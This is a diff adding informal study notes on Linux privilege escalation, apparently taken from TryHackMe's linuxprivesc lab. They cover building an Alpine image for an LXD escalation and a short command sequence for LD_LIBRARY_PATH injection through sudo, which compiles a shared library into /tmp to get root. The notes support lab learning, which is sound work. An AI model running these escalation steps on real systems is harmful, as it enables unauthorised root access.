@@ -1,0 +1,68 @@
+
+#LXD Containers
+
+-> goto  -->Browser --> LXD privilege Escalation -->Hacingarticals.in
+
+*See the artical about LXD privilege escalation.
+
+*Download linux distro alpine LXD
+
+->Search ->alpine LXD -> ,  github= saghul/lxd-alpine-builder  -->copy link
+
+$ git clone https://github.com/saghul/lxd-alpine-builder.git
+
+$cd lxd-alpine-builder/ ;ls
+
+$ sudo ./build-alpine
+
+*If you get the Error of Failed to install rootfs
+
+->do
+$ ls; cd rootfs/; ls
+
+$ cd usr/share ;ls
+
+$ sudo mkdir alpine-mirrors/; ls
+
+$ cd alpine-mirrors/
+
+$ sudo nano MIRRORS.txt
+
+[ https://alpine.mirror.wearetriple.com ]  --save
+
+$ cd ../../../../
+
+$ ls
+
+$ sudo ./build-alpine
+
+Note : do this while watching video
+
+
+
+
+#--------   LD_Library_PATH Injection   ---------
+
+goto:-- Tryhackme.com/room/linuxprivesc
+
+Task:7  Sudo-Enviroment Variables
+
+user@debian:-/tools/sudo $ sudo -l
+						$ldd /usr/sbin/apache2
+						$ls
+						$cat library-path.c
+						$ls
+						#-o = output
+						$gcc -fPIC -shared -o /tmp/libdl.so.2 library_path.c
+						$sudo LD_Library_PATH=/tmp /usr/sbin/apache2
+						$whoami
+						# now you can get the root access of the user
+						
+						
+
+
+#--------------------    SUID/SGID Binaries  ------------------
+
+goto:--    tryhackme.com/room/linuxprivesc
+
+#-------- SUID/SGID Executables --known Exploits
